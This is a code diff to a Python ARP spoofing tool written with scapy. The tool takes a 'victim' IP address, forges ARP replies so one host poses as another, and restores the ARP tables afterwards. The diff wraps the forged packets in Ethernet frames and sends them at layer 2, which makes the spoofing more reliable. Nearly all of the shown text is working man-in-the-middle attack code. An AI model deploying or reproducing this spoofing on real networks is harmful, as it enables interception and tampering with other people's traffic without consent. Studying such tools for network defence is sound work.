@@ -2,6 +2,7 @@ import optparse
 import scapy.all as scapy
 import time
 
+
 def get_argument():
     parser = optparse.OptionParser()
     parser.add_option('-t', '--target', dest='target_ip', help="Specify Victim IP Address")
@@ -29,13 +30,17 @@ def get_mac(ip):
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    scapy.send(arp_response, verbose=False)
+    ether = scapy.Ether(dst=target_mac)
+    packet = ether / arp_response
+    scapy.sendp(packet, verbose=False)
 
 def restore(dest_ip, src_ip):
     dest_mac = get_mac(dest_ip)
     src_mac = get_mac(src_ip)
-    arp_response = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip , hwsrc=src_mac)
-    scapy.send(arp_response, count=4, verbose=False)
+    arp_response = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
+    ether = scapy.Ether(dst=dest_mac)
+    packet = ether / arp_response
+    scapy.sendp(packet, count=4, verbose=False)
 
 
 options = get_argument()
